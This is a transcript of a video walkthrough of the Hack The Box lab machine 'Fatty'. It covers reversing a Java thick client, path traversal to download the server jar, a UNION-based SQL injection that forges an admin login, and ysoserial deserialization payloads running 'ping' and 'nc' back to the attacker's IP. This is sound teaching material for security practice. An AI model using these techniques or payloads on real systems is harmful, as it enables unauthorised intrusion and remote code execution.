 what's going on youtube this is ipsec we're doing fatty from hack the box another great box by qtc and hopefully i don't mispronounce his name like i did last week as xtc not sure why i did that but it's definitely qtc and he makes amazing boxes this one i haven't seen dumb for in hack the box either it's all about thick clients you find a java thick client you have to reverse it and reversing it you find out how it communicates to the server you find a potential lfi exploit you build your own java client to exploit that lfi download the server source code pull it down do some more java reverse engineering find two vulnerabilities a sql injection that's not done over http and a java deserialization after your sql injection to get shell on the box it's super cool and after i did the box i was kind of puzzled on an optimal way to do it so i got the author's write-up and learned a ton about doing just java reverse engineering when i did it originally i just kind of like decompiled the gui and uh made some hacky edits to the gui recompiled it all and ran it and it was kind of like a really long process if i did that for this video it would take an hours but looking over how the author suggested doing it you just like create your own java program load the jar up in a library and then you can just call the functions natively it's super cool and hopefully you guys learn as much as i did doing this with that being said let's just jump in as always we're going to start off with the map so dash sc for default scripts sv enumerate versions oh a output all formats print the nmap directory and call it fatty and then the ip address which is 10 10 10 174 can take some time to run so i've already ran it looking at the results we see a few ports open the first one being ftp on port 21 and we see anonymous ftp logins allowed and the script is telling us there's a few files we got a fatty client.jar and a few notes we also have the date of october 30th 2019 which can be interesting and then we also have ssh on port 22 and it's just running debian so let's go download all the files in that ftp server so i'm going to make dirt ftp go into this and i'm just going to do wget dash r to do a recursive get and then ftp colon slash 10 10 10 174 and wgit will default to anonymous so it's now downloading all of the files i'm just going to look inside this directory when wget recursive downloads things it just puts it in a folder called the ip so let's move everything in here to a current directory and then the one last thing i want to do is quickly log into this ftp server and just check for hidden files because i'm not positive if nmap will see them or not or w will see them or not so ftp 101010 174 anonymous i don't even have to type the password so dir dash a to do all and i don't see anything so i'm gonna assume i grabbed everything off this ftp server so let's go take a look at the notes so cat note dot text we have dear members because of some security issues we moved the port from fatty java server from 8000 to a hidden undocument port leaked furthermore there's two more instances one three three eight and one three three nine and they're just pretty much mirrors uh they didn't fix it in the jar file but senior java developers should be capable so we're going to have to probably check port 1337. so i'm just going to do nc zv uh 10 10 10 174. one three three seven and we see we are connected so since we have some weird ports listening i'm just gonna do a full port scan with nmap so pseudo nmap dash p dash dash o a nmap or uh oh i'm in the ftp directory sudo nmap dashb dash dash o a and map fatty dash all ports 10 10 10 174 and then let's go take a look at note 2. so experiment with new java layouts new client uses static layout if you use a tilting window manager such as probably like i3 or something make sure your resolution is mac so you can see things also they rely on java version 8. so if you're using 11 it probably won't work i'm getting flashbacks of like cisco's asa management software i think asdm or something because it also had this weird java requirement that only ran on old versions so keep that in mind uh let's take a look at note 3 and we they removed all user accounts because of a security issue until then you can use the qtc account with the password clara bb i don't know exactly what that is i'm going to hit alt f2 to bring up this run application thing and i'm going to do cherry tree it's probably going to open up notes from my last video so let's just delete this and then control n we're going to create uh baddie ctrl shift and notes and put highlights so we got creds um [Music] so this is note 3 told us that note 2 told us um java version eight and note one what was that uh port 1337 so let's go and just try opening up this jar file i'm going to run java jar fatty client and it's probably going to error out because i believe i thought it was on uh java version 11. i'm just going to do java dash dash version okay so maybe it doesn't error or maybe it errors right here so exception and thread awt event queue no class definition i'm just going to open this in version 8 and see if we get the same error message that's being displayed so i'm gonna do user i think lib jvm java dash eight open jdk bin java and then we're going to specify dash jar battery client and we could do like update alternatives in our cali and change our default to java 8 but then that'll probably break some other applications i use such as burp suite so i always hate changing the whole environment down this is generally how i do it so now we do test test click login and we aren't getting any error messages but nothing is happening when we click login the thing kind of just froze i can't click anything and we're just waiting here so gonna wait probably like 30 seconds pause the video and we'll see if we get some type of error message so it's been a while and this application is just doing nothing so we're going to close it out start it back up and this time when i do this i'm going to do a tcp dump and see if we can see it so sudo tcp dump dash i ton xero and then we will click log in and immediately we get connection error that didn't happen last time but we don't see any traffic so i'm guessing this is probably going to be dns so instead of ton 0 i'm going to do any and i'm going to specify udp port 53 which i believe is dns sport and then i'm going to click log in again and we're going to see some things so let's see we see it creating a server.fatty.ht record so since we can't get this it just doesn't know where to go so let's do sudo vi etsy host and i'm going to specify this actually going to localhost and the reason why i'm doing this is because i want to intercept it with burp so baddie.htb generally the first thing whenever i get a thick client is i see if it's http so we're going to open up go to our options tab uh add a proxy listener bind to port 8000 and it's going to redirect to 10 10 10 174 portly click ok so now whenever we connect to our local host on port 8000 it's going to go over to um the server so let's click login go over to burp suite and http history we don't really see anything and our thing hung again so at this point i'm guessing either this proxy isn't supported it's doing like some type of certificate pinning or maybe it's just not um http traffic and burp doesn't know how to handle it there used to be a plug-in invert called nope which stands i forget what it stands for but whenever burp wouldn't want to intercept it let you intercept anyways however that hasn't worked in the latest version of burp so instead of using burp to intercept we can close this out and we could probably try like um before we do that maybe force use of tls and invisible proxing try this turn intercept on um we can restart the client but i don't think that's going to do anything click login connection error 8000 101010174 disconnect that click log in we're just getting error messages so instead of using burp suite let's just use socat so close out of this close out of this and it's going to be uh let's do it on this tab socat tcp dash listen port 8000 fork and then tcp 10 10 10 174 port lead so what this is going to do it's going to listen on port 8000 on every connection it's going to fork so it doesn't hang and then it's going to forward that to 10 10 10 174 lead so we can run this and we didn't have to use sudo because we're not on a port below 1024 which are the privileged ports and then let's rename this window to socat and then go here reload the client task test click login and we get login failed so let's now i wonder if that was the error message we got before with bert but purple is intercepting so we should be fine um uh let's go cherry tree notes qtc is the user password is clara bb okay so qtc put this password in put to this just looking at standard out or a standard error i guess that is log in with this takes a few seconds and we get login successful so looking around we have profile who am i got this uh first thing i'm going to probably do is a pseudo wireshark i'm going to sniff this traffic to see if we can see what is happening so go on ton zero and we're gonna do this who am i again and it's going over tls so we'd have to decrypt this to see the traffic a little bit more effort than i want to do right now so let's just stop wireshark and see what else we have the server status page is um grayed out and one of the popular like thick client vulnerabilities is just like user privileges being handled on client side like if we edit this java file and enable these options we may be able to use them and they may lead to dangerous pieces of the application we have file browser config notes mail connection test pang help let's just do uh file browser configs so tmux config sudo is config sshd config let's look at this sshd config so we open it up and we can see authorized key file and stuff and at this point i know this is probably going to be on the uh agent's end right by agent and i mean this is on the server end because these files don't exist for me and looking at the notes maybe it's doing like an ftp connection to pull these or maybe not because shopping.txt was new um i think security.text was the same one we saw before we okay that's just talking about like a penetration test head findings uh we can look at report.text see what this is uh they're not talking about it so we don't really get any hints and i guess schedule.text we can look at but it doesn't seem to be too interesting so at this point we want to um analyze this java code so let's close out of this and what we're going to do is make a directory called reverse and i'm going to copy fatty client into reverse and there's a lot of tools we can use to um decompile java there's like jet x jd gui there's just a bunch but i'm going to use a tool called cfr let's open this up turn brip suite intercept off cfr java decompile yet another java d compiler so let's download this latest version copy link location wget and then we can call it with java dashjur cfr we need to um make an output path so this will be client so now java jar cfr dash dash output path i think is the argument and then dot slash client pattyclient.jar so now it is decompiling this and once it decompiles we'll be able to open it up in like an ide such as visual studio and analyze it it's finally all decompiled if we do it ls we just see the folder client if we do a finding client and type f we can see all the files and if you look there are java files which just is the source code this one's going to be a bit of a mess just because it's part of the spring framework if we go near probably in the directory we can find where the custom code is like in htb fatty client gui and then we got this client gui test.java but browsing code mainly in like vim is a pain so i'm going to use visual studio code on linux i just do codium it's just i guess the fork of it i don't know i don't know what that is what box that's from but we're gonna do open folder htb batty reverse client okay i don't save that and now we can go into the code generally how i like starting is i like starting where i think the main application is and then just kind of looking at functions so we can look at how it logs in we're in client gui test this is the actual gui of the application so we can look at where like a login button would be uh we got it creating the menu let's see public static void action performed username get password and here is where it's actually going to log in so we could trace this and potentially edit this application and then recompile it and try doing things like um for where's the folder that's mail let's go back to the application user lib jvm java 8 ben java dashjar fatty client tab autocomplete really saves lives um we look at file browser config so we look at this where file browser it's adding jmenu item config here's where it's setting enabled equals true so we could set enabled equals true on who am i and then when we log in probably this would be enabled or maybe you name your name was disabled that whole thing was but you get the point where we could just enable things and then open this client back up um i don't this is how i did the box and i just kept editing redoing going through the gui and this isn't a good way to test applications after reading the write-up that qtc wrote for this box he showed a much better way to do this and that's just using this jar file as kind of a library and running your own application around it invoking all these methods because it just makes it so much easier to edit so that's what we're going to be doing and we're going to do that in eclipse instead of visual studio just because i'm not good at java and i don't know how to get visual studio to do everything i want to so that's why i switched to eclipse so eclipse linux download i don't think it's in the app depository so we'll just download this and we may have to also install the jdk the java development kit i'm not sure if i only have the runtime environment and what no longer available to download uh control shifter no new package released linux 64-bit okay download save and we'll wait for this to finish downloading and put it into slash opt so cd opt mv downloads eclipse i'm just going to wait for part to finish and now that it's done we can just move it into our op directory so move downloads eclipse here and let's decompress it with tar and then i'm going to delete the tar archive go into eclipse and we're going to run it and the very first thing it's going to prompt for is like the eclipse workspace we could put it in the fatty area but um actually yeah let's do that let's do home ipsec htb fatty eclipse workspace and i'm going to specify use as default and don't ask again which is probably gonna bite me later because i'll be doing another box like why did it just save in the fatty instead of going into home ipsec eclipse but we'll cross that bridge when we get there i'm just going to create a hello world and create a java project project name we'll call this fatty client and i want to specify java 8 new project will be used let's configure jres add so we have to figure out how to get the version eight java so that was user lib jvm and this by one let's install the jdk open this is it installed do we have it apply okay that looks good not giving me an error okay so i probably had the jdk already installed i know the folder said um jdk but i've been swindled by java before and the folder said jd cable is really the jre let's do i guess new project maybe how do i create a java project that's what we specified class interface file let's do exploit.java okay and let's see open perspective click to i don't know what that's doing um let's see let's just try creating it so um public class uh not java we called it exploit and then oh my god that is a horrible default um theme window preferences general appearance dirk that's a bit better let's see is there a font colors and font text text edit let's change this to 15. awesome so that may be a bit easier to read so public static void main string probably needs capital that system out print line hello world can i write this in java do i know enough java to do this we'll find out click run and it prints hello world awesome so we have the basics of a java project let's now right click this and import that's not what i want right click build path configure build path libraries add external jar file and now let's go to a directory so home htb fatty reverse fatty client.jar and then apply and close and we're going to see we have this referenced so any functionality in this fatty client we can actually just perform now in our application so let's test that out by going back and codium and let's figure out how it does a login and see if we can replicate it so let's see uh public action performed client gui test this new user is that the first thing it does i think so but it's not using this variable until way down here the first thing it does is call this connection thing so let's set that going over to our eclipse project we can say um connection con is equal to null just creating the variable and we have our first error so we can just highlight over it and use whatever maybe it's called intellisense here but whatever the magic it is to automatically import it and that's going to import fatty client connection connection which is in this jar so fatty client connection connection class so that's what it just magically imported and then right here it's um probably just airing because the local variable's not used we could probably put a suppress in it to hide those messages but it's just a warning it's not needed so we want to connect by doing a connection get connection so let's do try con is equal to connection dot get connection tab auto complete did not work and then we have to catch errors so catch exception e and then system out print ln um connection failed and then add e get message and then we can exit okay so if we run this oh delete this token oh i had an underscore there the like syntax highlighting hid that uh underscore from me and i think it ran we don't have an actual success message so after this connection you will do a print line and then successfully connected go and we see it prints that and i guess we probably should have an exit so run that again and if we go back here let's go in socat we're going to kill this so now the application shouldn't be able to connect because it's going to local host port 8000 which goes nowhere and yeah let's just do that run this and we see connection ssl handshake failure so now we know we are connecting so let's do this put a comment connect to the server establish ssl okay so the next thing we need to do is log in to the server so let's go back here and it creates this user object and then it's assigning um arguments so we can do the same thing with user user equals new user and then the username probably qtc and then the password of whatever that word is okay and we probably have to do semicolon and it probably wants us to import some more things so again import there we go and it's probably just calling con.login right where is the login right here connection login and passes the object and that's just saying not used so let's do if con login user and we'll do system out print line this will be logged in else login failure and i need put semicolons enter like that login can be one word sure and did i delete my exit system exit that and this is technically a failure so exit the program after that run handshake failure so let's start up socat again run logging in and logged in so let's put a bad password so change this out for please subscribe click go successfully connected and man it takes a little bit for the login to happen but login failure so now we're good so what's the application first do once we log in so it's going to do get roll name and then based upon what the role name is it sets things so we could replicate this functionality um let's go back to eclipse check our users role and string role name con get roll name i wish my tab autocomplete was just completing that okay and then user dot set role by name is that what's it doing let's see set role by name role name okay i guess we can just print this out then so system out print ln roll plus was it role name maybe click go we put the password back so we should log in and roll user so that's looking fine so let's try doing a um i guess maybe a ping let's go back to our client and see something we could do and then something we couldn't do so let's go into reverse user lib jvm java i really should just like alias this bin java dashjar battyclient qtc copy paste login login successful so let's see we can't do server status we can do it who am i so let's use oh who am i goddess the role so we've already replicated that um we can probably get the username as well or yeah let's get the username so we can probably search who am i so this is calling invoker who am i and invoker is in methods in virgo.java who am i so this is the code we're going to be using so let's go back here check our user role get our username so we can do we gotta make the invoker what if invoke is used if this is going to be an issue invoke see go back here invoker let's go to the very first use doing private new inverter connection user so new invoker connection user and then again it's highlighted red but probably just have to import the method and again we can import all these methods because we imported the jar so now we can do try server response is equal to invoke dot who am i see cannot resolve to a variable so we probably want this to be a string how does this respond broker so this is a string so right here we can do server response and call this a string right i think that's right and now system out print line user plus server response it's probably not going to work cannot be resolved to a variable yeah you can uh we probably have to catch some exceptions let's try doing this without any catches okay proceed up we got problems there's three io unhandled exception so we have three unhandled exceptions so let's do the try again and then catch and message purse exception e let's copy an error message purse exception catch message build exception catch io exception and we should exit after each exception okay run sure uh compilation still problems can ioception cannot be resolved to a type throws io exception import it run let's see import import run there we go at least it built and the server response says username qtc so there we go so this is going to be invoke command so now we can play with commands so we can do invoke ping save run and see if we can print the response we're connected logged in and we get pong so with that being said um let's try you name ip config and things like that see if we can access dangerous functions so let's just see if it's like invoke dot u name sweet they made it easy call this save run and the benefit to doing it this way than just modifying the gui and trying a bunch is um mainly because this will create like a jar file and make it more easily reproducible so you'll have just an exploit file when we're done um your name is not allowed for this user account so we know they're doing server-side filtering on some things now so it's not just if we had enabled it we could magically access these functions so let's try like ipconfig successfully connected ipconfig is not allowed for this user account so it looks like they have done a good job on that we could go through every single function to see if there's something but yeah let's not worry about that so the main thing i want to look at is like this file browser so if we do like file browser dot dot open uh fail to open file configs if we do like slash etsy pass wd here open um still not working but i wonder if the client here is forcing this config directory to be set so if we remove this config directory i wonder if we can just access files on the host i mean that seems logical maybe we just don't have like if this piece of the string is hard-coded in the client then it could be hard for us to do things right so we could try a bunch of dot dot slashes and see if we can open it but when we do that it just rewrites it so let's go play with um files so let's see first thing i want to do is actually go in eclipse and let's go invoke and look at what options there are available to us and what could be fun to play with uh show files that that probably is it so show files and that wants a folder so if we just do current directory what happens so run successfully connected like that so let's try slash and look at this once it connects we're still here so let's go actually in the invoker option and make sure it's not hard coding something so invoker oh we're right here show files so we called it we put the folder and we just add this argument folder and i don't see anything with slash opt fadio whatever it was so it's not hard coded here let's go back into this application um what if we just put a dot dot and open fail to open file stream so let's just put dot dot in our application because this gui is specifying files so if we go in notes and then we say security dot text it opens the file but we now have the ability to specify folder so if we specify the folder dot dot let's see what happens going back into eclipse show files so single directory shows probably config notes and whatnot let's do dot dot and we'll see what we have connected it's logging in and we have extra things so logs tar start.sh and fatty server.jar so we can probably pull the server this application is talking to and then analyze it for vulnerabilities which is awesome if we tried like dot dot slash dot dot slash and see if the lfi works here probably won't we'll see what it says uh we just get fatty oh can we go again i'm not sure exactly what's happening let's see connected so i think if maybe it detects that was weird so i only did dot dot slash dot dot it actually went into opt and showed us fatty which is that but when we put this slash it didn't do anything so slash dot slash dot dot because this is weird i'm not sure exactly what's going on but when we try this traversal and have a long dot dot slash dot dot slash it rewrites it to this it only happens on that because this is successfully going up two directories see yeah uh i'm not sure exactly what happened at one point i saw just fatty but let's go and before we waste too much time yeah we just got fatty here and if we do just dot we get config notes and everything but i really want to see what start.sh is and what this um server is maybe start.sh has some type of herd coded credential and we can grab it grabbing the jar may be a little bit more difficult than just a text file because this is not an ascii file it's binary so we'll see if we have any issues with that um so let's go back into our code and there's probably a get file or something show files about open so we want to call this open class and get the file so we got folder name and file name so that's that's easy enough so all we change and here's from show files to be open and we can say the folder name as dot dot and start dot sh click run and hopefully we get the file which looks like we do so it's using docker right here we can see in the comment ssh su and run the java.jar so we can't just print this java file to standard out because it's not ascii data and also if we try to base64 encode it it may crash eclipse with some memory error i may have done that when i was practicing this video so i'm not going to worry about doing it that way we're just going to write it to a file so let's go and let's see we don't want to print right now we want to write a file and java has a filewriter so we can do filewriter f as the variable is equal to new file writer and the file name we want we'll do home ipsec hdb fatty guess reverse and we'll call this server.jar okay and we have an error but again let's just import follow writer out of java i o and magically it imports and we need to do new like that okay and then we can do f dot write and then we want server response then f dot close and then we exit so the very first thing we are grabbing is start sh so i guess we can system print lang whoa hit the wrong key print this and we can say wrote file i wonder if i'm going to have to handle an exception here not sure definitely don't want to print the response run this connected logged in root file so doesn't look like we aired out let's go i guess we can close this client we don't need the client anymore sweet we got server.juror but remember we just grabbed the stirred sh script and we see the file's there so let's remove server.jar and let's change this to be fatty server.jar i think that was a file name run it successfully connected logged in wrote file and we have the jar right there we do file against it looks to be an order so let's do user lib jvm java 8 then java dashjar server and we get it's corrupt and if i make the server let's just try unzipping it we get an error and it's missing a bunch of fights something weird happened and generally ascii strings are terminated with like a null byte so my best guess is a null byte happened in the string and it just stopped the download mode and we can see use binary mode if you called it correctly so we'll have to have this um application return us a uh binary blob actually before we do that let's try doing base 64. out of curiosity we're going to do it two different ways if this works we're going to do um the other way as well so let's try converting this into base 64 because i'm not sure if when the null byte happens it's terminating in the right call or when will we are assigning the string the server response so i'm not sure where that gets terminated i'm guessing the server response gets determined on the null byte but if it's the file right then we can just convert to base 64 before we write and we should be golden right so i don't actually know how to do base64 in java so let's just google base64 java base64 encoder does this give an example let's see come on that's not an example stack overflow this is where all the good programmers go to copy from steel import let's see this is an updated answer so java util base64 so we'll import this and then it wants us to uh byte bytes and then encode the string base64 encode to string we can try this i honestly have no idea what's going to happen so base64 encode to string server response dot get bytes and we can say um string please sub is equal that please sub semicolon there's no way this works and i'm probably going to confuse myself with all of this but that's the fun of doing these videos always push yourself try to learn something new each day let's click run and it doesn't look like it's erroring which is amazing uh profile so if we do file server dot j just ask a text space 60 ford so uh cat server dot jar base64-d uh we'll write that to server t d.jar i guess file it's a zip unzip and we still have the issue so after all that work we still don't have a working copy so at this point we're going to have to um get this uh where is it yeah get invoke open to return a binary because if we look at invoke open where is it it's returning string so this needs to be binary the issue is this is all compiled code so thankfully we can just import the decompiled version into a project and then edit it so we can overwrite some cool things let's go right click import general file system and then we'll do let's see home htb fatty reverse client and now we can specify what we want to import so i'm going into client methods and i just want the invoker so now this invoke class is going to be calling mine and not inside of this jar which will let us overwrite some cool things so let's see let's change this i'll uh probably don't need this don't need that don't need that okay print server response and instead of the open let's just call ping real quick uh i think it was ping did an error so we can run this to make sure it works connected and we get an error message uh can't seal package hdb fatty client methods it's already loaded and ceiling is kind of a like i guess security mechanism in java to make sure something has been tampered with but this is all happening client side so we can just tell it hey this is in a secure package and uh be golden so if you like googled around for like java unsealed jar you probably find something here again probably to stack overflow but we're gonna do it manually so uh let's see maker work let's copy fattyclient.jar to two locations we just copied a backup so we can overwrite that and then work and then unzip fatty client.jar rm actually unzip dot slash like that there we go so the main thing i wanted i just didn't want fatty client.jar in my working directory but if we look at meta inf and look at let's see manifest we have a bunch of shaw 256 sums and we also have this sealed equals true so i'm just going to unseal it by deleting this line and then i'm gonna hit a bunch of 1000s and delete cut try and delete the whole file i mean everyone struggles in vim from time to time so delete the rest of that file and then we will reseal it so zip dash or recursive fatty oh we can buy just do dot dot slash fatty client dot jar star like that oh no that updated um rm dot dot slash body client dot j zip there we go so update if we it was just like re-zipping into the current zip so i just wanted to delete it to get to a clean working state so now what happens if we run this do we still get the same error uh invalid signature file digest for manifest main attributes so didn't work properly so let's go back into the meta inf and if we grepped for maybe shaw on everything we see this one.ff or one.sf file also has shaw sums so looking at it let's just delete this file let's see there's an rsa file maybe binary yeah let's delete that and this is why i created a backup of the java client just because i may have screwed up here zip do this run see invalid signature file digest for main attributes rm pattyclient.jar i don't know why it went to the first one again let's run this and it worked we have now successfully unsealed the jar so we can edit things so we could go into this invoker thing look for ping and let's just make this print server or not um system dot holy crap what is it you know sometimes when you talk system out let's just copy that but when you talk and you just like have a brain fart of what you wanted to do that's what just happened there so please don't judge my java code so we're going to print this and we did it in this class so if this class is being executed and not the class in the jar we're going to see that message so click run connected and we see the message so now we can edit things so let's go back to the open where is open show files about open so we want a open that is not a string it wants to be binary or a byte array that's a lot of code copy paste that oh my god there we go we'll call this binary open and not string it's going to be bytes and let's see what's called we don't need all that i think this is all we want oh we need send and receive wait did we not copy send and receive i set it and then copied everything but that oh god and we want to now return i think return response what is the error is it bite yeah okay and let's see i got rid of that return because um i was returning a string and this is returning a byte and we still have an issue here uh let's see does not like that what did the code actually do where is response this dot response okay so we need this dot response get content probably so this is where it's getting it as string so there's probably a git content and get content as string or get content as binary or get content as byte or something so let's go back to our code this dot response dot get get bytes there we go okay so now we have a binary open that's pretty much the same as open but it returns bytes instead of string go back to our code and let's see invoke we're going to want to do binary open get rid of the ping i cannot convert so this needs to be byte server response okay i cannot convert so this will be no there we go and now we have to save the file so we definitely again don't want to print a binary blob i'm going to create a function public static void write file and we're going to put byte and file okay and now file output stream we'll try system out print ln wait what system out print okay whenever the like um thing doesn't come up of do you want to type this i get worried so saving to we'll do home ipsec htb fatty reverse and then fatty server dodger batty server.jar if i cared about quality code i'd make this an argument but i want it done quick okay then the next thing we do file output stream is equal to new paste the file name and we probably have to import something [Music] uh create class something's wrong let's see i'll output stream dot yeah we need to import something uh great class what did i do oh i've got the r there we go that was it f o s dot there we go right and we can write bytes so this will be n file and then close catch io exception and we want to whoops put like that i wonder if i can make this give me more real estate there we go okay so we should be able to call write file and then server response and i'm going to just run it because i don't think fatty server.jar exists oh even it did i typed it standard ipsec always typoing and writing bad code because we got an error let's see binary open ls didn't even write the file so server response null pointer 2 byte sine line 45. so this should have worked let's see this is an out print line i don't know if the error is here one of the errors in our binary open in the invoker successfully connected byten file let's see write file server response server response is a byte can we set breakpoint run see please break right here why did break points not hit you can tell how little i use java control shift b set break point i wonder there's something i have to do run last tool debug uh kind of launch is switch hey there we go so let's resume to hit the next one i don't know why i just went resume okay so go i think i just clicked that again sometimes i don't know why people watch my videos of just me struggling to do some things so invoke server response is equal to null right now so is there a step over in this there is and i guess i where am i i have no clue where i am stop let's kill this break point i guess ctrl shift b again to undo it we should break on this right file at write file we should have some type of byte and server response so right is throwing this argument null so maybe i'm not returning something correctly in invoke let's see let's go project explorer source here invoker okay binary open turn this response get bytes let's look at the function we plagiarized from get content what functions are in this response get let's do dot get let's try just get content maybe that's it uh we'd probably want to go through and look at the connection class for what like get bytes and get content differences but let's try this debug successfully connected role user we should hit the break point let's see server response and it's not null it looks like we have bytes so resume saving and we got it so that was it we just used the wrong method or something but let's fix our name fat server to fatty server.jar and then we can go into the server let's just try unzip fattyserver.jar and it unzips awesome so let's rmrf on everything in this directory um let's see where is that cfr tool we had maybe in where we reverse there we go java dash jar cfr uh is it here output no it's an output directory output path java dashjar cfr i think output path is equal to server pattyserver.jar there we go so now it's going to decompile the server where we can take a look at it so meanwhile let's just go back to our workstation or eclipse go here whoops here and get rid of this breakpoint and we probably won't have to write files again so i guess while that goes we can go through and look at all these functions if we took time and analyzed every single thing we would have noticed something weird about one of them open this change password so this is only callable by admins but change password and we're doing uh serialization so um just whenever you serialize objects and give them to user input bad things can happen like really bad things so i'm going to just put a note saying unserialized call and change pw and if you wanted kind of uh i guess introduction to deserialization just go over to like um ipsec dot rocks and search i guess the serial php and we've i have two videos here of advanced and intro to php deserialization it may just give you an idea of what this bug class is if you're unfamiliar with it but i'm going to put change pw equals d serialize and this is actually again protected by needing to be an admin so let's see how the server determines if you're an admin or not maybe we can get a way to become admin so that is now decompiled let's go into visual studio file open folder and i'm just going to open this whole reverse folder instead don't save so this will let us switch between well i was going to but turns out i clicked the wrong thing i think because i wanted to switch between server and client easily but looks like i screwed that one up so let's see methods db session connection [Music] so it's starting the listener get hers name get port i'm kind of looking for like the beginning workflow it's probably client connection so run on incoming generating a session id doing some sha-1 stuff looking for like login login message wrong credentials so let's see commands what's under run just starter pang file open so here's the open call uh let's see this is why we couldn't like get etsy past wd because it has this um regex of we're not regex just replacing looking for dot dot slash and then if it's happens more than a hundred times or less than a hundred times infinite loop detected so this is the server-side sanitization trying to prevent lfis the reason why we could grab the uh up one directory is because we had dot dot uh slash dot dot not slash dot dot slash so we never hit this function there's the hardcoded for the file name that we were trying to play with if we thought like when we gave folder name and the um client we're just appending to this so that's why we couldn't edit opt fatty files to just be like slash etsy so here's the change password thing we noted in the client and it doing desealization you name users netstat ipconfig looking at handler this is just finding messages so if we get ping do commands.ping so db session let's look at this we have mysql and we have a hard coded password right here so qtc and secure database powered by whatever so let's copy this and try ssh oh no i said copy not hit a key but let's try ssh again so ssh qtc at 10 10 10 174 except the fingerprint only allows public keys so we can't even do a password authentication or private like key based authentication so can't even do that i okay let's just leave that so check login and right here we have a sql statement and then user and this looks like it's just getting straight um what is it input from the user like i don't see any sanitization here so user get username so we're doing a select statement and only doing git username and we also have this sleep 3000 and maybe microseconds so maybe this is sleep three seconds so that's where the delay is coming from whenever you try logging in the program pauses for a few seconds it's probably this so right here it looks like we may have some type of sql injection so let's go back to client there's eclipse let's change this back to a string and this will just be and then print that so we're not writing files anymore that is all done we just want to get back to where we can ping okay so now we want to do a sql injection so let's try user qtc semicolon or single quote or one equals one comment it out let's go and let's see login failure and if we look at this new user class it kind of hints at what's happening user i guess i'd have to import it where is this getting it from let's see we're going to open up the client file open folder if i select reverse don't save there we go client hdb maybe shared connection where is user where's this user object there we go resource user so we have a bunch of ways we can define it um for a sake of simplicity of explaining it let's just import it so import file system uh let's see go back to our home htb fatty reverse client can't remember if i was in this directory or not i think here select client hdb fatty shared resources and we want user oh it airs i don't know what i just did hitting that key may have been a mistake um help so what i'm going to do is back things up so let's go where our eclipse directory is because this is where our code is right yes so cp dash r cp eclipse workspace to eclipseworkspace.back sometimes when you hit a button we have things happen so let's just run this because it's going to save see if it still works looks like it does so i don't think that caused any issues oh i'm in the invoker still i thought it was an exploit so now if i do user user equals new user oh it still doesn't show everything i can do well now i can click here instead of going to visual studio code um let's see it has this one boolean option for hash and what i think is happening here just based upon the server code is let's go back to server htb connection java database if we're looking at how this checks user we don't have any password we just have it saying get username so it's not even going for the password and if we look at this um resource we can see let's see does it do it if we don't specify this boolean hash as false it's going to actually hash the username and the password and some type of salt i guess this is or a secret and then it only passes this combination so what we're passing to the server right here is just a hash string that will exist in the database i think so let's turn this boolean to false so going back to here because if we hit this then it's not going to do a hash and just going to pass everything as we'd expect so let's try login this does that work maybe not create constant lowercase f so now we should hit where we don't hash so let's try going in again successfully connected login failure still so what we could try doing is a union injection and overwriting this so we can say qtc instead of this or one equals one we could try something like union select uh probably xero username please subscribe email let's do root ipsec.rocks password um we'll do ipsec roll let's do admin let's try that and i left this quote off just hoping the server handles that and this is doing a single quote there so we should have the right type of quote so let's click go and see if we did it successfully connected login failure still so where did we screw up we can try taking this hashed false thing doing it again and i could just have my union syntax wrong but let's try id is equal to one maybe it starts at one instead of zero because what the union's doing is overwriting what this does and this user may actually exist so maybe this union is forcing it to take um two rows we only want to return one row so maybe this return two so we'll put definitely does not exist so this user won't exist in the database now let's try running it successfully connected login failure let's see union select maybe quote there successfully connected login failure still let's try going over here put a single quote and a comment see if this works run successfully connected login failure so let's make sure we counted everything right so i'm going to copy this let's go back here and let's break this out so id username email password role so username is going to be well hold on let's go here so id id 1 username please subscribe email root ipsec.rocks password ipsec roll admin so we have everything right um let's see let's go back into user.java is there just like a username and then boolean user nothing i wonder if we could just put that so what's this doing string username password see go back to the server code check login it's only getting user and let's highlight instance of password so it is getting a password down here i just don't know if this is coming from the sql query or this let's just try going back to our code we put the password as ipsec so ipsec here ipsec in the password field so now when the sql query returns this it's going to be correct successfully connected logged in role is admin so he finally did it so that was a weird sequel injection but we can move on and one of the things we couldn't do before was an ipconfig so let's go where is invoke here ipconfig so we can now potentially run this command because we are an admin so there's the output we can see the ip address is 172 2803 there was references to docker before so i'm assuming we're in docker there's also the change password function which was a deserialization and let's just call that so let's look at the invoker let's see change password and see what this is so what this is going to do it's going to take the username and the password and then it's going to serialize it and send it we only want to send a malicious payload so what i'm going to do is essentially what we did with the binary the file open i'm going to create a new function and this one's going to exploit this and essentially it's just going to be change password but all this stuff removed and just accept a string from us so this like that so now we got the change password and we're going to call this um exploit change password get rid of that there we go and we just want this and we can return something just so it's happy but i don't think we actually have to return anything because it's all we want um we don't want two variables we just want one so i'm going to call this the payload and i don't know if we need a string i want to say we can just do add argument payload i think that's right so in our exploit java we can now instead of invoke ipconfig we can do invoke exploit change password payload and we have to create our payload and for this we're just going to use yso serial so i'm going to go to yso serial github proof of concept tool and we're going to use this to generate an exploit so download the latest from jetpack save it and we could probably just import wiser serial as a jar into a project and um work with it that way but again if this video is showing you anything it's that i'm not a java guy so that's why i'm not doing it that way java jar root downloads not root oh downloads and again can't thank qtc enough for his write-up teaching me how to do a java thick client exploitation this way instead of how you'll probably see it on like xerox df's blog post i'm guessing not that he did it incorrectly that's how i did the first time this is just i think a more optimized way and creates a nice little um like jar file if you want to exploit it later so we got commons collections and this is the painful part part of doing java detailization you just try a bunch of things until something works so let's go back to our code we can look at the server and let's see org apache commons collections so we have it so we can just try all of these uh let's see 3-0 do we know what version it uses does this say i don't know what version this is but let's just start with one and go through them all if this doesn't work another one is probably the spring framework but let's just try this library so go here paste the thing we want and then the command ping dash c1 10 10 14 i am 3 so i no longer have my 10 10 14 2 sad day c 1 like that and we got the payload we have to base 60 for it and saying this um r0ab rohab is how i remember this it's a base64 encoded um java des serialized object if you see aced so let me just copy this by clipboard but if we just xxd this go to the top if you see aced 005 and like a wireshark capture that means it's a java payload that's not base64 encoded so there's the magic bytes of it definitely pay attention to that whenever you see them think i can exploit this because you sent the server a serialized object let's do string payload is equal to paste and sudo tcp dom dash i ton zero icmp run successfully connected logged in failed to purse action message looking back here we don't have anything so did we do this correct where is that failed to purse action message let's see invoker do we have that in here that strings not found so i don't know where that string is let's try a different thing maybe ping is blocked so let's try the payload netcat so go back to where base64-w0 is and we can try nc 1010143 9001 and we can copy this go back to our payload paste save nclvmp 9001 run and hope we did this correct successfully connected failed to purse and we don't have a connection so something got screwed up fail to press action message let's see search for exploit see we can probably grab this string go to a visual studio thing edit find in files paste that 